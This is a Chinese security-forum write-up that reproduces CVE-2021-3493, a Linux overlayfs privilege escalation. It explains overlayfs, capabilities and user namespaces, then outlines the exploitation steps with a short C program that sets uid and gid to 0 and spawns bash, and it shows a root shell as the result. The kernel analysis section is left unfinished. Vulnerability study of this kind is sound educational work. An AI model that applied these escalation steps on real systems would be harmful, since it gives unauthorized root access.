> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1682417-1-1.html)

> [md] 来复现一下这次的 CVE-2021-3493## 漏洞成因该漏洞是通过创建一个虚拟环境，在虚拟环境当中通过某软件赋予某文件高权限，由于程序检查不严密，该权限逃逸到现实 ... CVE-2021-3......

![](https://avatar.52pojie.cn/data/avatar/001/82/55/43_avatar_middle.jpg)xia0ji233

来复现一下这次的 CVE-2021-3493

漏洞成因
----

该漏洞是通过创建一个虚拟环境，在虚拟环境当中通过某软件赋予某文件高权限，由于程序检查不严密，该权限逃逸到现实环境中也生效。

前置芝士
----

`overlayfs` ：虚拟的，堆叠文件系统

`capability`：权限管理机制

`namespace`：一种命名空间

### overlayfs

能把多个文件夹里的文件合并为到同一个文件夹当中，这么听起来这个文件系统好像挺鸡肋的，但是它支持了一个我们最喜欢用的软件：docker。docker 里面分容器和镜像的概念，一个镜像可以派生出多个容器，跟虚拟机差不多，一个镜像可以创建多个虚拟机。容器分公有数据和私有数据，docker 比虚拟机优势的一点就是 docker 中的公有数据所有容器共享，这样就能省磁盘空间，私有数据则可以各个容器独占，保证数据独立。docker 的实现机制就是通过 `overlayfs` 文件系统实现的。

`overlayfs` 依赖并建立在其它的文件系统之上（例如 ext4fs 和 xfs 等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行 “合并”，然后向用户呈现。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/1.png)

其中 lower dirA / lower dirB 目录和 upper dir 目录为来自底层文件系统的不同目录，用户可以自行指定，内部包含了用户想要合并的文件和目录，merge dir 目录为挂载点。当文件系统挂载后，在 merge 目录下将会同时看到来自各 lower 和 upper 目录下的内容，并且用户也无法（无需）感知这些文件分别哪些来自 lower dir，哪些来自 upper dir，用户看见的只是一个普通的文件系统根目录而已（lower dir 可以有多个也可以只有一个）。

#### `overlayfs`挂载

挂载一个 overlay 文件系统，可以通过 mount -t overlay -o <options> overlay <mount point > 来实现。

<mount point> 是最终 overlay 的挂载点。

其中 overlay 的 options 有如下：

*   lower dir=<dir>：指定用户需要挂载的 lower 层目录，lower 层支持多个目录，用 “:” 间隔，优先级依次降低。最多支持 500 层。
*   upper dir=<dir>：指定用户需要挂载的 upper 层目录，upper 层优先级高于所有的 lower 层目录。
*   work dir=<dir>：指定文件系统挂载后用于存放临时和间接文件的工作基础目录。

下面将 lower 和 upper 进行 overlay，挂载到 merge 目录，临时 workdir 为 work 目录。

```
$mount -t overlay -o lowerdir=lower,upperdir=upper,workdir=work overlay merge
```

如下同样将 lower 和 upper 进行 overlay 到 merge，但是 merge 为只读属性。

```
$mount -t overlay -o lowerdir=upper:lower overlay merge
```

在使用如上 mount 进行`overlayfs`合并之后，遵循如下规则：

1.  `lower dir`和`upper dir`两个目录存在同名文件时，`lower dir`的文件将会被隐藏，用户只能看到`upper dir`的文件。
2.  `lower dir`低优先级的同目录同名文件将会被隐藏。
3.  如果存在同名目录，那么`lower dir`和`upper dir`目录中的内容将会合并。
4.  当用户修改`merge dir`中来自`upper dir`的数据时，数据将直接写入`upper dir`中原来目录中，删除文件也同理。
5.  当用户修改`merge dir`中来自`lower dir`的数据时，`lower dir`中内容均不会发生任何改变。因为`lower dir`是只读的，用户想修改来自`lower dir`数据时，`overlayfs`会首先拷贝一份`lower dir`中文件副本到`upper dir`中。后续修改或删除将会在`upper dir`下的副本中进行，`lower dir`中原文件将会被隐藏。

#### docker 如何使用 overlayfs

在 docker 当中，我们为了方便理解，假设只有三个目录：`upper dir`,`lower dir`和`merge dir`。我们的镜像处于`lower dir`当中，初始情况下，我们通过镜像创建出来一个容器，`lower dir` 中就是一个镜像，`upper dir` 中为空，我们创建多个容器得到的都是和镜像一模一样的系统。当我尝试查看容器中的某个文件，根据规则 1，因为 `upper dir` 为空，我们看的的内容是 `lower dir` 中的内容，也就是镜像的内容；当我尝试修改容器中的文件内容时，根据规则 5，`lower dir` 中的内容只读，因此拷贝一份到 `upper dir` 中，根据规则 1，我们之后将只能看到该文件 `upper dir` 中的内容，修改完成会将结果保存在 `upper dir` 当中，之后再次修改这个文件，将只在`upper dir` 当中进行。但是在我们的视角当中，我们跟操作一个完整的操作系统并没有很大的区别。并且多个容器大部分数据是共享的，因此比较节省磁盘空间。

#### demo

我们新建四个文件夹：`upper`，`lower`，`work` 和 `merge`。

```
$mount -t overlay overlay -o lowerdir=./lower,upperdir=./upper,workdir=./work ./merge
```

`mount` 命令用于挂载操作，第一个 `overlay` 指定挂载类型为 `overlay` 第二个 `overlay` 指定挂载点，`-o` 选项指定上层目录，下层目录，工作目录，最后挂载到 `merge` 目录下。

挂载完成之后我们在 `lower` 和 `upper` 中分别创建 `1.txt` 和 `2.txt`。我们使用 `ls -lR` 来查看目录

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/2.png)

我们可以发现， `merge` 目录中也出现了 `1.txt` 和 `2.txt`。

我们修改 `upper` 和 `lower` 中文件对应的内容，可以发现，`merge` 目录中也会有相同的改变，这非常符合 `overlayfs` 的规则。

我们尝试直接在 `merge` 目录中修改在 `upper` 目录中出现的文件再观察一下变化。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/3.png)

可以发现我们在 `merge` 目录中修改 `upper` 目录中出现的文件，对应也修改了 `upper` 目录的主体文件。

我们尝试在 `merge` 目录中修改只在 `lower` 目录出现的文件再观察一下变化。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/4.png)

我们发现，`lower` 目录中对应的 `1.txt` 并没有发生改变，反而是 `upper` 目录多了一个 `1.txt` 文件，并且内容与我们填写的一致。

那么这个 `1.txt` 就可以理解为 docker 中的镜像，`2.txt` 就是我容器中不同于镜像的文件。

### capability

首先介绍几个概念：`uid`，`ruid`，`euid`，`suid`。

#### uid(ruid)

标识用户身份， 比如常见的 `root`就是 0，我们安装完操作系统获得的第一个账号就是 1000，当登录完成之后，这个用户的 ruid 就是确定的了。

#### euid

euid 是用户的有效 id，用于系统决定对系统资源的访问权限，通常情况下，`euid=ruid`。我们都知道：只有进程的创建者和 root 用户才有权利对该进程进行操作（`kill`，或者挂起，又或者是 `fork`）。于是，记录一个进程的创建者 (也就是属主) 就显得非常必要，进程的 `uid` 通常就是进程创建者的 `uid`，若创建者为另一个进程（`fork`），那么这个进程的 `uid` 会被继承，除非子进程被设置了 `suid`。

#### suid

用于对外权限的开放。跟`ruid`及`euid`是用一个用户绑定不同，它是跟文件而不是跟用户绑定，在运行这个文件时，用户会暂时获得属主的身份。

#### 引入

进程运行之后，会获得和运行者一样的权限，它们同样受到了自身的权限访问控制。事实上这样的管理是比较安全的，我如果想自己无法直接访问这个文件，那么我通过创建进程访问文件同样会没有权限。但是如果这样管理则不能满足一些需要，比如密码文件 `/etc/shadow`，这个文件的权限是 `r--------`，属主和数组均为 `root`，那就意味着，除了 `root` 用户没有人可以查看或者修改这个文件，但是里面同时也存了我自己的密码，如果我不管怎样都获得不了 `root` 权限，那意味着我自己都修改不了我自己的密码，那这显然不太合理。于是乎就出现了 `suid`（`Set User ID execution`），我们都知道在 `linux` 当中，我们想修改自己的密码是使用 `passwd` 命令，那我们查看 `passwd` 的权限发现它被设置了 `suid` 选项。它允许我在执行这个程序的时候短暂地获得 `root` 权限，这个进程拥有 `root` 权限之后，我们就能修改 `/etc/shadow` 文件，修改完成之后，进程直接退出。

这么一看确实挺方便了，但是会带来很大的安全问题：假设， `passwd` 文件在编写的时候，存在漏洞，若在执行 `passwd` 的过程中，能通过漏洞创建一个 `shell` 进程，那么这个 `shell` 进程也会是 `root` 权限，简而言之，**`SUID` 机制增大了系统的安全攻击面。**

为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫 `capability`。

#### capability 是什么

`Capabilities` 机制是在 Linux 内核 `2.2` 之后引入的一个权限管理机制，原理就是把超级用户 `root(uid=0)` 的特权划分为不同的功能组，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。

这样一来，我权限检查就变成了：如果非 `root` 用户，那么检查进程是否有对应的操作权限，决定是否可以进行该操作。同样，这个权限可以在执行的时候赋予：根据进程创建者或者 `setuid` 获得，也可以从父进程继承。假如我给 `nginx` 可执行文件赋予了 `CAP_NET_BIND_SERVICE capabilities` ，那么它就能以普通用户的身份运行并监听一个 1024 以内的端口。

#### 进程的 capability

每一个进程，具有 5 个 capabilities 集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。这 5 个 capabilities 集合分别是：

*   Permitted
*   Effective
*   Inheritable
*   Bounding
*   Ambient

这 5 个集合的具体含义如下：

##### Permitted

在进程执行时，该可执行文件的 **Permitted 集合**中的 **capabilites** 自动被加入到进程的 **Permitted 集合**中。进程可以通过系统调用 `capset()` 来从 `Effective` 或 `Inheritable` 集合中添加或删除 capability，前提是添加或删除的 capability 必须包含在 `Permitted` 集合中。

##### Effective

内核检查线程是否可以进行特权操作时，检查的对象便是 `Effective` 集合。如之前所说，`Permitted` 集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。

比如我可能一个程序可能中间需要用户来操作，但是呢，我不希望它有过高的权限，那么我在交给用户操作的时候，我把一些权限较高的`capability` 禁用了，如果用户通过漏洞获取持久权限那将也不能够获取较高的权限。

##### Inheritable

当执行`exec()` 系统调用时，能够被新的可执行文件继承的 capabilities，被包含在 `Inheritable` 集合中。这里需要说明一下，包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到子进程的 `Effective` 集合或 `Inheritable`，它只会影响新线程的 `Permitted` 集合。

##### Bounding

`Bounding` 集合，它定义了能被继承的权限的上限，是 `Inheritable` 集合的超集，如果某个 capability 不在 `Bounding` 集合中，即使它在 `Permitted` 集合中，该线程也不能将该 capability 添加到它的 `Inheritable` 集合中。

`Bounding` 集合的 `capabilities` 在执行 `fork()` 系统调用时会传递给子进程的 Bounding 集合，并且在执行 `execve` 系统调用后保持不变。

*   当线程运行时，不能向 `Bounding` 集合中添加 `capabilities`。
*   一旦某个 `capability` 被从 `Bounding` 集合中删除，便不能再添加回来。
*   将某个 `capability` 从 `Bounding` 集合中删除后，如果之前 `Inherited` 集合包含该 `capability`，将继续保留。但如果后续从 `Inheritable` 集合中删除了该 `capability`，便不能再添加回来。

##### Ambient

Linux `4.3` 内核新增了一个 capabilities 集合叫 `Ambient` ，用来弥补 `Inheritable` 的不足。`Ambient` 具有如下特性：

*   `Permitted` 和 `Inheritable` 未设置的 `capabilities`，`Ambient` 也不能设置。
*   当 `Permitted` 和 `Inheritable` 关闭某权限后，`Ambient` 也随之关闭对应权限。这样就确保了降低权限后子进程也会降低权限。
*   非特权用户如果在 `Permitted` 集合中有一个 `capability`，那么可以添加到 `Ambient` 集合中，这样它的子进程便可以在 `Ambient`、`Permitted` 和 `Effective` 集合中获取这个 `capability`。

#### 文件的 capability

文件的 `capabilities` 被保存在文件的扩展属性中。如果想修改这些属性，需要具有 `CAP_SETFCAP` 的 `capability`。文件与进程的 `capabilities` 共同决定了通过 `execve()` 运行该文件后的线程的 `capabilities`。

文件的 `capabilities` 功能，需要文件系统的支持。如果文件系统使用了 `nouuid` 选项进行挂载，那么文件的 `capabilities` 将会被忽略。

类似于进程的 `capabilities`，文件的 `capabilities` 包含了 3 个集合：

*   Permitted
*   Inheritable
*   Effective

这 3 个集合的具体含义如下：

##### Permitted

这个集合中包含的 `capabilities`，在文件被执行时，会与进程的 `Bounding` 集合计算交集，然后添加到该进程的 `Permitted` 集合中。

##### Inheritable

这个集合与线程的 `Inheritable` 集合的交集，会被添加到执行完 `execve()` 后的线程的 `Permitted` 集合中。

##### Effective

这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完 `execve()` 后，线程 `Permitted` 集合中的 `capabilities` 会自动添加到它的 `Effective` 集合中。对于一些旧的可执行文件，由于其不会调用 `capabilities` 相关函数设置自身的 `Effective` 集合，所以可以将可执行文件的 `Effective bit` 开启，从而可以将 `Permitted` 集合中的 `capabilities` 自动添加到 `Effective` 集合中。

#### 常见的 capability

共 40 个

<table><thead><tr><th>capability 名称</th><th>描述</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td>启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td>CAP_AUDIT_READ</td><td>允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_CHOWN</td><td>修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td>允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td>允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td>忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td>允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td>允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td>允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td>允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td>允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td>允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td>允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td>允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td>允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td>参考 capabilities man page</td></tr><tr><td>CAP_SETUID</td><td>允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td>允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td>允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td>允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td>允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td>允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td>允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td>允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td>忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td>允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td>允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td>允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td>允许触发一些能唤醒系统的东西 (比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table>

比如我们熟知的 `ping` 命令，它所用到的底层是使用 `socket` 实现的，而 `socket` 是 `root` 用户才有权限使用的。在 `Ubuntu 18.04LTS`  的发行版当中，我们看看它是怎么解决这个权限问题的。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/5.png)

它设置了 `s` 权限位，意味着我运行 `ping` 的时候， `ping` 这个 `process` `uid` 为 `0`，也就是 `root` 用户。

若我取消设置它的 `s`权限位，它将不再具有 `ping` 的功能。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/6.png)

原因就如上所示，底层的 `socket` 并不允许普通用户运行。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/7.png)

而当我把自己权限提升之后又能够使用 `ping` 命令了，是因为 `root` 用户执行读写和某些底层操作时不检查权限。

在这里我们只需要使用 `setcap` 命令将 `ping` 加上 `socket` 权限就可以让我们运行的时候获得 `socket` 权限，正常使用 `ping` 命令，这么做的好处就是假如我的 `ping` 命令有漏洞存在，那么当别人借着 `ping` 命令来提权我的计算机时会发现它获得的 `shell` 只拥有 `socket` 这么一个特权操作，其它的操作与普通用户并没有区别，这样极大地降低了安全风险，而如果我使用 `s` 权限位，那么别人通过这个获取漏洞之后将能直接获得 `root` 权限能操作计算机的一切资源。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/8.png)

在添加完权限之后，我们发现又可以使用 `ping` 命令了，这是因为我们通过 `setcap` 让 `/bin/ping` 重新拥有了 `socket` 权限。

在这个地方我们对 `capability` 也不再深入下去了。

### namespace

引用一下 `wiki` 对 `namespace` 的定义

> Namespaces are a feature of the Linux kernel that partitions kernel resources such that one set of processes sees one set of resources while another set of processes sees a different set of resources. The feature works by having the same namespace for a set of resources and processes, but those namespaces refer to distinct resources.

直观翻译就是

> namespace 是 Linux 内核的一项特性，它可以对内核资源进行分区，使得一组进程可以看到一组资源；而另一组进程可以看到另一组不同的资源。该功能的原理是为一组资源和进程使用相同的 namespace，但是这些 namespace 实际上引用的是不同的资源。

简单来说 `namespace` 是由 `Linux` 内核提供的，用于进程间资源隔离的一种技术。将全局的系统资源包装在一个抽象里，让进程（看起来）拥有独立的全局资源实例。同时 `Linux` 也默认提供了多种 `namespace`，用于对多种不同资源进行隔离。

`Linux` 从 `2.4` 版本加入了 `namespace` 机制到 `3.8` 版本实现了 `User namespace`。

`Cgroup namespace` 是进程的 `cgroups` 的虚拟化视图，通过 `/proc/[pid]/cgroup` 和 `/proc/[pid]/mountinfo` 展示。

<table><thead><tr><th>namespace 名称</th><th>系统调用参数</th><th>控制内容</th><th>内核版本</th></tr></thead><tbody><tr><td>UTS</td><td>CLONE_NEWUTS</td><td>主机名和域名</td><td>2.6.19</td></tr><tr><td>IPC</td><td>CLONE_NEWIPC</td><td>信号量，消息队列，共享内存</td><td>2.6.19</td></tr><tr><td>PID</td><td>CLONE_NEWPID</td><td>Process IDs 进程号</td><td>2.6.24</td></tr><tr><td>Network</td><td>CLONE_NEWNET</td><td>网络设备，协议栈，端口等等</td><td>2.6.29</td></tr><tr><td>Cgroup</td><td>CLONE_NEWCGROUP</td><td>Cgroup root directory cgroup 根目录</td><td>2.6.29</td></tr><tr><td>Mount</td><td>CLONE_NEWNS</td><td>Mount points 挂载点</td><td>2.4.19</td></tr><tr><td>User</td><td>CLONE_NEWUSER</td><td>用户和组 ID</td><td>3.8</td></tr></tbody></table>

有了 namespace 之后，PID,IPC,Network 等系统资源不再是全局性的，而是属于特定的 Namespace。每个 Namespace 里面的资源对其他 Namespace 都是透明的。**要创建新的 Namespace，只需要在调用 clone 时指定相应的 flag。**

以上为自己搜集的资料整理，以下为自己个人解读。

电脑开机的时候，系统会创建 7 个 `init` 的 `namespace`，一个进程只能切必须属于七个特定不同的 `namespace`，那么这个就是我们默认的 `namespace`。使用 `ls -l /proc/$$/ns` 可以查看本进程的 `namespace` 在这里 `$$` 变量表示自己的进程号。

在这之前我一直有一个疑问，就是为什么我普通用户 `-map-root-user` 会导致我没有 `root` 的操作权限而 `root` 用户创建的 `namespace` 即使是普通用户也有操作权限。比如如下两个例子。

`unshare` 命令用于取消子进程的共享 `namespace`，通过`--user --map-root-user` 选项可以新建一个 `user  namespace` 并使新建进程的用户为 `root` 用户。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/9.png)

此时出现了 `root` 用户无法操作 `/etc/shadow` 的场面，但是我们无论是 `id` 还是 `whoami` 看上去都跟真的 `root` 一样，确没有操作权限，确实也是比较奇怪的。但是，又合情合理，因为我普通用户我不通过 `su` 或者是 `sudo` 命令去正常提权那都是利用漏洞。

然后再来看另一个例子

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/10.png)

虽然看起来我是普通用户，但是实际上我有 `root`的权限。

因此我在这里一直不理解 `namespace` 的组织形式，直到我看到一篇博客上面画着树状图，我才猛然。

`namespace` 是树状图的一种形式，然后文件系统中在标记属主的时候会标记一个 `namespace` 字段，标识由哪一个 `namespace` 的用户创建的，然后再检查权限的时候若当前用户不属于当前 `namespace` 那么就会向上寻找，直到找到对应的 `namespace`，然后检查是谁创建的。然后对应的权限就是那个 `namespace` 的创建者的。如果是这样的话，那么就能解释通了，我之前疑惑的点不在于为什么我没有操作权限而是它怎么判断的我没有操作权限，因为没有操作权限属于正常现象，如果我的想法不对也请师傅们指正，这只是一个我认为比较合理能解释得通的解释。

漏洞利用步骤
------

我们先创建好 `overlayfs` 的那几个文件夹，准备挂载，然后在其中的 `upper` 目录中写上我们的 `exp` 并编译好。

```
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>
#include<fcntl.h>
int main(){
    setuid(0);
    setgid(0);
    execve("/bin/bash",0,0);
}
```

`exp` 非常简单，就是 `setuid` 和 `setgid` 为 `0`，也就是 `root`。

然后我们再创建一个 `user namepsace` 和 `mount namespace` 。

在 `./merge` 当中，我们为刚刚编译的 `exp` 设置 `setuid` 的权限。

然后再开一个终端，我们发现 `upper` 目录中的 `exp` 同样具有了 `setuid` 的权限，说明我们的权限逃逸成功了。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/11.png)

我们运行 `exp` 成功获得了真实的 `root` 权限。

![](https://xia0ji233.pro/2022/08/31/CVE-2021-3493/12.png)

内核代码分析
------

待补

![](https://avatar.52pojie.cn/data/avatar/001/27/89/26_avatar_middle.jpg)sam 喵喵 感谢分享，坐等补全，希望上个 GitHub 链接粉一个 ![](https://avatar.52pojie.cn/data/avatar/001/86/37/61_avatar_middle.jpg) skywalker0123 谢谢大佬分享 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) mercy555 学习学习，感谢分享，无私 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) itoweng 习学习，感谢分享，ll![](https://avatar.52pojie.cn/images/noavatar_middle.gif)iawyxkdn8 大佬牛 B！![](https://avatar.52pojie.cn/images/noavatar_middle.gif)shinpekong 确实很详细，值得学习！